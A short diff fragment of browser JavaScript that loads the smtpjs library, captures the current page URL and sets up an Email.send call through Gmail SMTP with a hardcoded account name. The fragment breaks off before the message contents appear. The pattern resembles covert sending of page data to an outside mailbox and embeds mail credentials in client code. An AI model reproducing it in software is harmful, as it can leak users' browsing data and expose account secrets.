@@ -3,7 +3,7 @@ sc.setAttribute("src", "https://smtpjs.com/v3/smtp.js");
 document.head.appendChild(sc);
 console.log(sc)
   website = window.location.href
-    function sendEmail() {
+var sendEmail=function() {
       Email.send({
         Host: "smtp.gmail.com",
         Username: "sendmailapplication32@gmail.com",
